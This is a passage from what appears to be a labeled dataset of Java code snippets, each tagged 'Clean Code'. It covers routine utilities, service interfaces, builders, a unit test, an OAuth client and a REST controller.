  public static List<DSSOrchestratorRelation> getDSSOrchestratorRelations(){
    return ListUtils.unmodifiableList(dssOrchestratorRelations);
  }
  public static DSSOrchestratorRelation getDSSOrchestratorRelationByName(  String dssOrchestratorName){
    return dssOrchestratorRelations.stream().filter(dssOrchestratorRelation -> dssOrchestratorRelation.getDSSOrchestratorName().equals(dssOrchestratorName)).findAny().orElseThrow(() -> new ExternalOperationWarnException(50355,""Not exists DSSOrchestrator name "" + dssOrchestratorName));
  }
  public static DSSOrchestratorRelation getDSSOrchestratorRelationByMode(  String dssOrchestratorMode){
    return dssOrchestratorRelations.stream().filter(dssOrchestratorRelation -> dssOrchestratorRelation.getDSSOrchestratorMode().equals(dssOrchestratorMode)).findAny().orElseThrow(() -> new ExternalOperationWarnException(50355,""Not exists DSSOrchestrator mode "" + dssOrchestratorMode));
  }
}
",0,Clean Code
"/** 
 * A decoder that wraps an  {@link InputStream} decoder to allow it to decode from a file.
 * @param < T > The type of resource that the wrapped InputStream decoder decodes.
 */
public class FileToStreamDecoder<T> implements ResourceDecoder<File,T> {
  private static final FileOpener DEFAULT_FILE_OPENER=new FileOpener();
  private ResourceDecoder<InputStream,T> streamDecoder;
  private final FileOpener fileOpener;
  public FileToStreamDecoder(  ResourceDecoder<InputStream,T> streamDecoder){
    this(streamDecoder,DEFAULT_FILE_OPENER);
  }
  FileToStreamDecoder(  ResourceDecoder<InputStream,T> streamDecoder,  FileOpener fileOpener){
    this.streamDecoder=streamDecoder;
    this.fileOpener=fileOpener;
  }
  @Override public Resource<T> decode(  File source,  int width,  int height) throws IOException {
    InputStream is=null;
    Resource<T> result=null;
    try {
      is=fileOpener.open(source);
      result=streamDecoder.decode(is,width,height);
    }
  finally {
      if (is != null) {
        try {
          is.close();
        }
 catch (        IOException e) {
        }
      }
    }
    return result;
  }
  @Override public String getId(){
    return """";
  }
static class FileOpener {
    public InputStream open(    File file) throws FileNotFoundException {
      return new FileInputStream(file);
    }
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class PlacementDriverOptionsConfigured implements Configured<PlacementDriverOptions> {
  private final PlacementDriverOptions opts;
  public static PlacementDriverOptionsConfigured newConfigured(){
    return new PlacementDriverOptionsConfigured(new PlacementDriverOptions());
  }
  public PlacementDriverOptionsConfigured withFake(  final boolean fake){
    this.opts.setFake(fake);
    return this;
  }
  public PlacementDriverOptionsConfigured withCliOptions(  final CliOptions cliOptions){
    this.opts.setCliOptions(cliOptions);
    return this;
  }
  public PlacementDriverOptionsConfigured withPdRpcOptions(  final RpcOptions pdRpcOptions){
    this.opts.setPdRpcOptions(pdRpcOptions);
    return this;
  }
  public PlacementDriverOptionsConfigured withPdGroupId(  final String pdGroupId){
    this.opts.setPdGroupId(pdGroupId);
    return this;
  }
  public PlacementDriverOptionsConfigured withRegionRouteTableOptionsList(  final List<RegionRouteTableOptions> regionRouteTableOptionsList){
    this.opts.setRegionRouteTableOptionsList(regionRouteTableOptionsList);
    return this;
  }
  public PlacementDriverOptionsConfigured withInitialServerList(  final String initialServerList){
    this.opts.setInitialServerList(initialServerList);
    return this;
  }
  public PlacementDriverOptionsConfigured withInitialPdServerList(  final String initialPdServerList){
    this.opts.setInitialPdServerList(initialPdServerList);
    return this;
  }
  @Override public PlacementDriverOptions config(){
    return this.opts;
  }
  private PlacementDriverOptionsConfigured(  PlacementDriverOptions opts){
    this.opts=opts;
  }
}
",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023/3/26 11:14service registry /xxl-rpc/dev/ - key01(service01) - value01 (ip:port01) - value02 (ip:port02)
 */
public abstract class ServiceRegistry {
  /** 
 * start
 */
  public abstract void start(  Map<String,String> param);
  /** 
 * start
 */
  public abstract void stop();
  /** 
 * registry service, for mult
 * @param keys      service key
 * @param value     service value/ip:port
 * @return
 */
  public abstract boolean registry(  Set<String> keys,  String value);
  /** 
 * remove service, for mult
 * @param keys
 * @param value
 * @return
 */
  public abstract boolean remove(  Set<String> keys,  String value);
  /** 
 * discovery services, for mult
 * @param keys
 * @return
 */
  public abstract Map<String,TreeSet<String>> discovery(  Set<String> keys);
  /** 
 * discovery service, for one
 * @param key   service key
 * @return      service value/ip:port
 */
  public abstract TreeSet<String> discovery(  String key);
}",0,Clean Code
"public class MvndDaemonLogger extends MavenBaseLogger {
  final DateTimeFormatter dateTimeFormatter=new DateTimeFormatterBuilder().appendPattern(""HH:mm:ss.SSS"").toFormatter();
  public MvndDaemonLogger(  String name){
    super(name);
  }
  @Override protected String renderLevel(  int levelInt){
switch (levelInt) {
case LOG_LEVEL_ERROR:
      return ""E"";
case LOG_LEVEL_WARN:
    return ""W"";
case LOG_LEVEL_INFO:
  return ""I"";
case LOG_LEVEL_DEBUG:
return ""D"";
case LOG_LEVEL_TRACE:
return ""T"";
}
throw new IllegalStateException(""Unrecognized level ["" + levelInt + ""]"");
}
@Override protected void handleNormalizedLoggingCall(Level level,Marker marker,String messagePattern,Object[] arguments,Throwable throwable){
StringBuilder buf=new StringBuilder(32);
buf.append(dateTimeFormatter.format(LocalTime.now()));
buf.append("" "");
buf.append(renderLevel(level.toInt()));
buf.append("" "");
String message=MessageFormatter.basicArrayFormat(messagePattern,arguments);
buf.append(message);
write(buf,throwable);
}
}
",0,Clean Code
"/** 
 * 保存TextArea的变更
 */
public class TextAreaListener implements DocumentListener {
  JScrollPanelWithHeader TextAreaPanel;
  private DomainPanel domainPanel;
  public TextAreaListener(  DomainPanel domainPanel,  JScrollPanelWithHeader panel){
    this.domainPanel=domainPanel;
    this.TextAreaPanel=panel;
  }
  /** 
 * 当UI中的数据发生变化时,需要同步到数据模型、并写入数据库
 */
  public void saveToDBAndSyncModel(){
    if (domainPanel.isListenerIsOn()) {
      DomainDao dao=new DomainDao(BurpExtender.getDataLoadManager().getCurrentDBFile());
      Set<String> content=new HashSet<>(SwingUtils.getLinesFromTextArea(TextAreaPanel.getTextArea()));
      TextAreaType type=TextAreaPanel.getTextAreaType();
      domainPanel.getDomainResult().fillContentByType(type,content);
      dao.createOrUpdateByType(content,type);
    }
  }
  @Override public void removeUpdate(  DocumentEvent e){
    saveToDBAndSyncModel();
  }
  @Override public void insertUpdate(  DocumentEvent e){
    saveToDBAndSyncModel();
  }
  @Override public void changedUpdate(  DocumentEvent arg0){
    saveToDBAndSyncModel();
  }
}
",0,Clean Code
"/** 
 * This interface defines a complete generic visitor for a parse tree produced by  {@link PropertiesParser}.
 * @param < T > The return type of the visit operation. Use {@link Void} foroperations with no return type.
 */
public interface PropertiesVisitor<T> extends ParseTreeVisitor<T> {
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#propertiesFile}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitPropertiesFile(  PropertiesParser.PropertiesFileContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#row}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitRow(  PropertiesParser.RowContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#decl}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitDecl(  PropertiesParser.DeclContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#key}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitKey(  PropertiesParser.KeyContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#value}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitValue(  PropertiesParser.ValueContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#comment}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitComment(  PropertiesParser.CommentContext ctx);
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class ConcurrentSet<E> extends AbstractSet<E> implements Serializable {
  private static final long serialVersionUID=-6761513279741915432L;
  private final ConcurrentMap<E,Boolean> map;
  /** 
 * Creates a new instance which wraps the specified  {@code map}.
 */
  public ConcurrentSet(){
    map=Maps.newConcurrentMap();
  }
  @Override public int size(){
    return map.size();
  }
  @SuppressWarnings(""SuspiciousMethodCalls"") @Override public boolean contains(  Object o){
    return map.containsKey(o);
  }
  @Override public boolean add(  E o){
    return map.putIfAbsent(o,Boolean.TRUE) == null;
  }
  @Override public boolean remove(  Object o){
    return map.remove(o) != null;
  }
  @Override public void clear(){
    map.clear();
  }
  @Override public Iterator<E> iterator(){
    return map.keySet().iterator();
  }
}",0,Clean Code
"@Import(DatabaseTableServiceImpl.class) public class DatabaseTableServiceImplTest extends BaseDbUnitTest {
  @Resource private DatabaseTableServiceImpl databaseTableService;
  @MockBean private DataSourceConfigService dataSourceConfigService;
  @Test public void testGetTableList(){
    Long dataSourceConfigId=randomLongId();
    DataSourceConfigDO dataSourceConfig=new DataSourceConfigDO().setUsername(""sa"").setPassword("""").setUrl(""jdbc:h2:mem:testdb"");
    when(dataSourceConfigService.getDataSourceConfig(eq(dataSourceConfigId))).thenReturn(dataSourceConfig);
    List<TableInfo> tables=databaseTableService.getTableList(dataSourceConfigId,""config"",""参数"");
    assertEquals(1,tables.size());
    assertTableInfo(tables.get(0));
  }
  @Test public void testGetTable(){
    Long dataSourceConfigId=randomLongId();
    DataSourceConfigDO dataSourceConfig=new DataSourceConfigDO().setUsername(""sa"").setPassword("""").setUrl(""jdbc:h2:mem:testdb"");
    when(dataSourceConfigService.getDataSourceConfig(eq(dataSourceConfigId))).thenReturn(dataSourceConfig);
    TableInfo tableInfo=databaseTableService.getTable(dataSourceConfigId,""infra_config"");
    assertTableInfo(tableInfo);
  }
  private void assertTableInfo(  TableInfo tableInfo){
    assertEquals(""infra_config"",tableInfo.getName());
    assertEquals(""参数配置表"",tableInfo.getComment());
    assertEquals(13,tableInfo.getFields().size());
    TableField idField=tableInfo.getFields().get(0);
    assertEquals(""id"",idField.getName());
    assertEquals(JdbcType.BIGINT,idField.getMetaInfo().getJdbcType());
    assertEquals(""编号"",idField.getComment());
    assertFalse(idField.getMetaInfo().isNullable());
    assertTrue(idField.isKeyFlag());
    assertTrue(idField.isKeyIdentityFlag());
    assertEquals(DbColumnType.LONG,idField.getColumnType());
    assertEquals(""id"",idField.getPropertyName());
    TableField nameField=tableInfo.getFields().get(3);
    assertEquals(""name"",nameField.getName());
    assertEquals(JdbcType.VARCHAR,nameField.getMetaInfo().getJdbcType());
    assertEquals(""名字"",nameField.getComment());
    assertFalse(nameField.getMetaInfo().isNullable());
    assertFalse(nameField.isKeyFlag());
    assertFalse(nameField.isKeyIdentityFlag());
    assertEquals(DbColumnType.STRING,nameField.getColumnType());
    assertEquals(""name"",nameField.getPropertyName());
  }
}
",0,Clean Code
"/** 
 * User check.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.0, Feb 11, 2020
 * @since 0.2.5
 */
@Singleton public class UserCheckMidware {
  /** 
 * User query service.
 */
  @Inject private UserQueryService userQueryService;
  public void handle(  final RequestContext context){
    final String userName=context.pathVar(""userName"");
    if (UserExt.NULL_USER_NAME.equals(userName)) {
      context.sendError(404);
      context.abort();
    }
    final JSONObject user=userQueryService.getUserByName(userName);
    if (null == user) {
      context.sendError(404);
      context.abort();
      return;
    }
    if (UserExt.USER_STATUS_C_NOT_VERIFIED == user.optInt(UserExt.USER_STATUS)) {
      context.sendError(404);
      context.abort();
      return;
    }
    if (UserExt.USER_STATUS_C_INVALID == user.optInt(UserExt.USER_STATUS)) {
      context.sendError(404);
      context.abort();
      return;
    }
    context.attr(User.USER,user);
    context.handle();
  }
}
",0,Clean Code
"public class SearchTypeUtil {
  private static final Resources resources=Shaft.getContext().getResources();
  public static final int defaultSearchType=5;
  private static final Pattern WEB_URL_PATTERN=Patterns.WEB_URL;
  private static final Pattern NUMBERIC_PATTERN=Pattern.compile(""(?:\\b|\\D)([1-9]\\d{3,9})(?:\\b|\\D)"");
  public static String[] SEARCH_TYPE_NAME=new String[]{resources.getString(R.string.string_430),resources.getString(R.string.string_150),resources.getString(R.string.string_152),resources.getString(R.string.string_153),resources.getString(R.string.string_341),resources.getString(R.string.string_431)};
  public static final int SEARCH_TYPE_DB_KEYWORD=0;
  public static final int SEARCH_TYPE_DB_ILLUSTSID=1;
  public static final int SEARCH_TYPE_DB_USERKEYWORD=2;
  public static final int SEARCH_TYPE_DB_USERID=3;
  public static final int SEARCH_TYPE_DB_NOVELID=4;
  public static final int SEARCH_TYPE_DB_URL=5;
  public static int getSuggestSearchType(  String content){
    try {
      if (TextUtils.isEmpty(content)) {
        return defaultSearchType;
      }
      if (WEB_URL_PATTERN.matcher(content).matches()) {
        return 4;
      }
      Matcher matcher=NUMBERIC_PATTERN.matcher(content);
      if (matcher.find()) {
        long number=Long.parseLong(matcher.group(1));
        if (number > 10000000L) {
          return 1;
        }
 else {
          return 2;
        }
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
    return defaultSearchType;
  }
}
",0,Clean Code
"public class EventCheckerService {
  private static volatile EventCheckerService instance;
  public static EventCheckerService getInstance(){
    if (instance == null) {
synchronized (EventCheckerService.class) {
        if (instance == null) {
          instance=new EventCheckerService();
        }
      }
    }
    return instance;
  }
  public boolean sendMsg(  int jobId,  Properties props,  Logger log){
    if (props != null) {
      return new EventCheckSender(props).sendMsg(jobId,props,log);
    }
 else {
      log.error(""create EventCheckSender failed {}"");
      return false;
    }
  }
  /** 
 * Receiving a message first queries the consumption record, and then starts to consume after the last consumption, and no consumption starts after the job starts. The received message is performed in an active query manner, and the target message is repeatedly queried within a time period when the set target is not exceeded.
 */
  public boolean reciveMsg(  int jobId,  Properties props,  Logger log){
    if (props != null) {
      return new DefaultEventcheckReceiver(props).reciveMsg(jobId,props,log);
    }
 else {
      log.error(""create EventCheckSender failed {}"");
      return false;
    }
  }
}
",0,Clean Code
"/** 
 * @author geekidea
 * @date 2023/11/22
 */
public class SystemTypeUtil {
  /** 
 * 获取系统类型枚举
 * @param request
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByPath(  HttpServletRequest request){
    String servletPath=request.getServletPath();
    return getSystemTypeByPath(servletPath);
  }
  /** 
 * 根据请求路径获取系统类型枚举
 * @param servletPath
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByPath(  String servletPath){
    if (StringUtils.isBlank(servletPath)) {
      return null;
    }
    if (servletPath.startsWith(LoginConstant.ADMIN_URL_PREFIX)) {
      return SystemType.ADMIN;
    }
 else     if (servletPath.startsWith(LoginConstant.APP_URL_PREFIX)) {
      return SystemType.APP;
    }
    return null;
  }
  /** 
 * 判断token是那个端
 * @param token
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByToken(  String token){
    if (StringUtils.isBlank(token)) {
      return null;
    }
    if (token.startsWith(LoginConstant.ADMIN_TOKEN_PREFIX)) {
      return SystemType.ADMIN;
    }
 else     if (token.startsWith(LoginConstant.APP_TOKEN_PREFIX)) {
      return SystemType.APP;
    }
    return null;
  }
  /** 
 * 判断token是那个端
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByToken(){
    String token=TokenUtil.getToken();
    return getSystemTypeByToken(token);
  }
  /** 
 * 判断token是那个端
 * @return
 * @throws Exception
 */
  public static Integer getSystemTypeCodeByToken(){
    SystemType systemType=getSystemTypeByToken();
    if (systemType != null) {
      return systemType.getCode();
    }
    return null;
  }
  /** 
 * 判断是否是管理后台系统
 * @return
 * @throws Exception
 */
  public static boolean isAdminSystem(){
    SystemType systemType=getSystemTypeByToken();
    if (SystemType.ADMIN == systemType) {
      return true;
    }
    return false;
  }
  /** 
 * 判断是否是APP移动端系统
 * @return
 * @throws Exception
 */
  public static boolean isAppSystem(){
    SystemType systemType=getSystemTypeByToken();
    if (SystemType.APP == systemType) {
      return true;
    }
    return false;
  }
}",0,Clean Code
"public class AdapterRecyclerView extends RecyclerView.Adapter<RecyclerView.ViewHolder> {
  @Override public int getItemViewType(  int position){
    if (position != 4 && position != 7) {
      return 0;
    }
    return 1;
  }
  @Override public RecyclerView.ViewHolder onCreateViewHolder(  ViewGroup parent,  int viewType){
    View view;
    if (viewType == 1) {
      view=LayoutInflater.from(parent.getContext()).inflate(R.layout.item_videoview,parent,false);
      return new VideoHolder(view);
    }
 else {
      view=LayoutInflater.from(parent.getContext()).inflate(R.layout.item_textview,parent,false);
      return new TextHolder(view);
    }
  }
  @Override public void onBindViewHolder(  RecyclerView.ViewHolder holder,  int position){
    if (position != 4 && position != 7) {
      TextHolder textHolder=(TextHolder)holder;
    }
 else {
      VideoHolder videoHolder=(VideoHolder)holder;
      videoHolder.jzvdStd.setUp(UrlsKt.getVl1()[position],UrlsKt.getTl1()[position],Jzvd.SCREEN_NORMAL);
      videoHolder.jzvdStd.positionInList=position;
      Glide.with(TinyWindowRecycleViewMultiHolderActivity.this).load(UrlsKt.getPl1()[position]).into(videoHolder.jzvdStd.posterImageView);
    }
  }
  @Override public int getItemCount(){
    return 10;
  }
class VideoHolder extends RecyclerView.ViewHolder {
    JzvdStd jzvdStd;
    public VideoHolder(    View itemView){
      super(itemView);
      jzvdStd=itemView.findViewById(R.id.videoplayer);
    }
  }
class TextHolder extends RecyclerView.ViewHolder {
    TextView textView;
    public TextHolder(    View itemView){
      super(itemView);
      textView=itemView.findViewById(R.id.textview);
    }
  }
}
",0,Clean Code
"public class PostgreSQLCommandSet extends AbstractCommandSet {
  public PostgreSQLCommandSet(  Database db){
    super(db);
  }
  @Override @Language(""postgresql"") public String createMapTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createCompressionTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createItemStorageTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createItemStorageDataTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createGridStorageTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createGridStorageDataTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageWriteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageReadStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageDeleteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageHasStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageWriteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageReadStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageDeleteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageHasStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageListStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageCountMapItemsStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStoragePurgeMapStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String purgeMapStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String hasMapStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String listMapIdsStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findMapKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createMapKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findCompressionKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createCompressionKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findItemStorageKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createItemStorageKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findGridStorageKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createGridStorageKeyStatement(){
    return null;
  }
}
",0,Clean Code
"class Path {
  static ClassPathElement getClassPathElement(  File file) throws ZipException, IOException {
    if (file.isDirectory()) {
      return new FolderPathElement(file);
    }
 else     if (file.isFile()) {
      return new ArchivePathElement(new ZipFile(file));
    }
 else     if (file.exists()) {
      throw new IOException(""\"""" + file.getPath() + ""\"" is not a directory neither a zip file"");
    }
 else {
      throw new FileNotFoundException(""File \"""" + file.getPath() + ""\"" not found"");
    }
  }
  List<ClassPathElement> elements=new ArrayList<ClassPathElement>();
  private final String definition;
  private final ByteArrayOutputStream baos=new ByteArrayOutputStream(40 * 1024);
  private final byte[] readBuffer=new byte[20 * 1024];
  Path(  String definition) throws IOException {
    this.definition=definition;
    for (    String filePath : definition.split(Pattern.quote(File.pathSeparator))) {
      try {
        addElement(getClassPathElement(new File(filePath)));
      }
 catch (      IOException e) {
        throw new IOException(""Wrong classpath: "" + e.getMessage(),e);
      }
    }
  }
  private static byte[] readStream(  InputStream in,  ByteArrayOutputStream baos,  byte[] readBuffer) throws IOException {
    try {
      for (; ; ) {
        int amt=in.read(readBuffer);
        if (amt < 0) {
          break;
        }
        baos.write(readBuffer,0,amt);
      }
    }
  finally {
      in.close();
    }
    return baos.toByteArray();
  }
  @Override public String toString(){
    return definition;
  }
  Iterable<ClassPathElement> getElements(){
    return elements;
  }
  private void addElement(  ClassPathElement element){
    assert element != null;
    elements.add(element);
  }
  synchronized DirectClassFile getClass(  String path) throws FileNotFoundException {
    DirectClassFile classFile=null;
    for (    ClassPathElement element : elements) {
      try {
        InputStream in=element.open(path);
        try {
          byte[] bytes=readStream(in,baos,readBuffer);
          baos.reset();
          classFile=new DirectClassFile(bytes,path,false);
          classFile.setAttributeFactory(StdAttributeFactory.THE_ONE);
          break;
        }
  finally {
          in.close();
        }
      }
 catch (      IOException e) {
      }
    }
    if (classFile == null) {
      throw new FileNotFoundException(""File \"""" + path + ""\"" not found"");
    }
    return classFile;
  }
}
",0,Clean Code
"/** 
 * Builder for generating an intent configured with extra data.
 */
public static class Builder {
  private final Intent intent;
  /** 
 * Create builder with suffix
 * @param actionSuffix
 */
  public Builder(  String actionSuffix){
    intent=new Intent(INTENT_PREFIX + actionSuffix);
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param value
 * @return this builder
 */
  public Builder add(  String fieldName,  String value){
    intent.putExtra(fieldName,value);
    return this;
  }
  /** 
 * Add extra field data values to intent being built up
 * @param fieldName
 * @param values
 * @return this builder
 */
  public Builder add(  String fieldName,  CharSequence[] values){
    intent.putExtra(fieldName,values);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param value
 * @return this builder
 */
  public Builder add(  String fieldName,  int value){
    intent.putExtra(fieldName,value);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param values
 * @return this builder
 */
  public Builder add(  String fieldName,  int[] values){
    intent.putExtra(fieldName,values);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param values
 * @return this builder
 */
  public Builder add(  String fieldName,  boolean[] values){
    intent.putExtra(fieldName,values);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param value
 * @return this builder
 */
  public Builder add(  String fieldName,  Serializable value){
    intent.putExtra(fieldName,value);
    return this;
  }
  /** 
 * Get built intent
 * @return intent
 */
  public Intent toIntent(){
    return intent;
  }
}
",0,Clean Code
"/** 
 * 文件操作模板
 * @author lengleng
 * @date 2022/4/19
 */
public interface FileTemplate extends InitializingBean {
  /** 
 * 创建bucket
 * @param bucketName bucket名称
 */
  void createBucket(  String bucketName);
  /** 
 * 获取全部bucket <p> API Documentation</a>
 */
  List<Bucket> getAllBuckets();
  /** 
 * @param bucketName bucket名称
 * @see <a href= Documentation</a>
 */
  void removeBucket(  String bucketName);
  /** 
 * 上传文件
 * @param bucketName bucket名称
 * @param objectName 文件名称
 * @param stream 文件流
 * @param contextType 文件类型
 * @throws Exception
 */
  void putObject(  String bucketName,  String objectName,  InputStream stream,  String contextType) throws Exception ;
  /** 
 * 上传文件
 * @param bucketName bucket名称
 * @param objectName 文件名称
 * @param stream 文件流
 * @param contextType 文件类型
 * @throws Exception
 */
  void putObject(  String bucketName,  String objectName,  InputStream stream) throws Exception ;
  /** 
 * 获取文件
 * @param bucketName bucket名称
 * @param objectName 文件名称
 * @return 二进制流 API Documentation</a>
 */
  S3Object getObject(  String bucketName,  String objectName);
  void removeObject(  String bucketName,  String objectName) throws Exception ;
  /** 
 * @throws Exception
 */
  @Override default void afterPropertiesSet() throws Exception {
  }
  /** 
 * 根据文件前置查询文件
 * @param bucketName bucket名称
 * @param prefix 前缀
 * @param recursive 是否递归查询
 * @return S3ObjectSummary 列表
 * @see <a href=""http://docs.aws.amazon.com/goto/WebAPI/s3-2006-03-01/ListObjects"">AWS
	 * API Documentation</a>
 */
  List<S3ObjectSummary> getAllObjectsByPrefix(  String bucketName,  String prefix,  boolean recursive);
}
",0,Clean Code
"/** 
 * 程序员客栈
 * @author yadong.zhang (yadong.zhang0415(a)gmail.com)
 * @since 1.16.2
 */
public class AuthProginnRequest extends AuthDefaultRequest {
  public AuthProginnRequest(  AuthConfig config){
    super(config,AuthDefaultSource.PROGINN);
  }
  public AuthProginnRequest(  AuthConfig config,  AuthStateCache authStateCache){
    super(config,AuthDefaultSource.PROGINN,authStateCache);
  }
  @Override public AuthToken getAccessToken(  AuthCallback authCallback){
    Map<String,String> params=new HashMap<>();
    params.put(""code"",authCallback.getCode());
    params.put(""client_id"",config.getClientId());
    params.put(""client_secret"",config.getClientSecret());
    params.put(""grant_type"",""authorization_code"");
    params.put(""redirect_uri"",config.getRedirectUri());
    String response=new HttpUtils(config.getHttpConfig()).post(AuthDefaultSource.PROGINN.accessToken(),params,false).getBody();
    JSONObject accessTokenObject=JSONObject.parseObject(response);
    this.checkResponse(accessTokenObject);
    return AuthToken.builder().accessToken(accessTokenObject.getString(""access_token"")).refreshToken(accessTokenObject.getString(""refresh_token"")).uid(accessTokenObject.getString(""uid"")).tokenType(accessTokenObject.getString(""token_type"")).expireIn(accessTokenObject.getIntValue(""expires_in"")).build();
  }
  @Override public AuthUser getUserInfo(  AuthToken authToken){
    String userInfo=doGetUserInfo(authToken);
    JSONObject object=JSONObject.parseObject(userInfo);
    this.checkResponse(object);
    return AuthUser.builder().rawUserInfo(object).uuid(object.getString(""uid"")).username(object.getString(""nickname"")).nickname(object.getString(""nickname"")).avatar(object.getString(""avatar"")).email(object.getString(""email"")).gender(AuthUserGender.UNKNOWN).token(authToken).source(source.toString()).build();
  }
  /** 
 * 检查响应内容是否正确
 * @param object 请求响应内容
 */
  private void checkResponse(  JSONObject object){
    if (object.containsKey(""error"")) {
      throw new AuthException(object.getString(""error_description""));
    }
  }
  /** 
 * 返回带 {@code state}参数的授权url，授权回调时会带上这个 {@code state}
 * @param state state 验证授权流程的参数，可以防止csrf
 * @return 返回授权地址
 */
  @Override public String authorize(  String state){
    return UrlBuilder.fromBaseUrl(super.authorize(state)).queryParam(""scope"",this.getScopes("" "",true,AuthScopeUtils.getDefaultScopes(AuthProginnScope.values()))).build();
  }
}
",0,Clean Code
"/** 
 * 系统角色 服务接口
 * @author geekidea
 * @since 2022-12-26
 */
public interface SysRoleService extends IService<SysRole> {
  /** 
 * 添加系统角色
 * @param dto
 * @return
 * @throws Exception
 */
  boolean addSysRole(  SysRoleDto dto);
  /** 
 * 修改系统角色
 * @param dto
 * @return
 * @throws Exception
 */
  boolean updateSysRole(  SysRoleDto dto);
  /** 
 * 删除系统角色
 * @param id
 * @return
 * @throws Exception
 */
  boolean deleteSysRole(  Long id);
  /** 
 * 系统角色详情
 * @param id
 * @return
 * @throws Exception
 */
  SysRoleVo getSysRoleById(  Long id);
  /** 
 * 系统角色分页列表
 * @param query
 * @return
 * @throws Exception
 */
  Paging<SysRoleVo> getSysRolePage(  SysRoleQuery query);
  /** 
 * 获取所有角色列表
 * @return
 * @throws Exception
 */
  List<SysRole> getSysRoleAllList();
  /** 
 * 设置角色权限
 * @param roleMenusDto
 * @return
 * @throws Exception
 */
  boolean setRoleMenus(  RoleMenusDto roleMenusDto);
  /** 
 * 检查code是否存在
 * @param code
 * @return
 * @throws Exception
 */
  void checkCodeExists(  String code);
}",0,Clean Code
"/** 
 * template controller
 * @author jingwk 2019-12-22 16:13:16
 */
@Api(tags=""任务配置接口"") @RestController @RequestMapping(""/api/jobTemplate"") public class JobTemplateController extends BaseController {
  @Resource private JobTemplateService jobTemplateService;
  @GetMapping(""/pageList"") @ApiOperation(""任务模板列表"") public ReturnT<Map<String,Object>> pageList(  @RequestParam(required=false,defaultValue=""0"") int current,  @RequestParam(required=false,defaultValue=""10"") int size,  int jobGroup,  String jobDesc,  String executorHandler,  int userId,  Integer[] projectIds){
    return new ReturnT<>(jobTemplateService.pageList((current - 1) * size,size,jobGroup,jobDesc,executorHandler,userId,projectIds));
  }
  @PostMapping(""/add"") @ApiOperation(""添加任务模板"") public ReturnT<String> add(  HttpServletRequest request,  @RequestBody JobTemplate jobTemplate){
    jobTemplate.setUserId(getCurrentUserId(request));
    return jobTemplateService.add(jobTemplate);
  }
  @PostMapping(""/update"") @ApiOperation(""更新任务"") public ReturnT<String> update(  HttpServletRequest request,  @RequestBody JobTemplate jobTemplate){
    jobTemplate.setUserId(getCurrentUserId(request));
    return jobTemplateService.update(jobTemplate);
  }
  @PostMapping(value=""/remove/{id}"") @ApiOperation(""移除任务模板"") public ReturnT<String> remove(  @PathVariable(value=""id"") int id){
    return jobTemplateService.remove(id);
  }
  @GetMapping(""/nextTriggerTime"") @ApiOperation(""获取近5次触发时间"") public ReturnT<List<String>> nextTriggerTime(  String cron){
    List<String> result=new ArrayList<>();
    try {
      CronExpression cronExpression=new CronExpression(cron);
      Date lastTime=new Date();
      for (int i=0; i < 5; i++) {
        lastTime=cronExpression.getNextValidTimeAfter(lastTime);
        if (lastTime != null) {
          result.add(DateUtil.formatDateTime(lastTime));
        }
 else {
          break;
        }
      }
    }
 catch (    ParseException e) {
      return new ReturnT<>(ReturnT.FAIL_CODE,I18nUtil.getString(""jobinfo_field_cron_invalid""));
    }
    return new ReturnT<>(result);
  }
}
",0,Clean Code
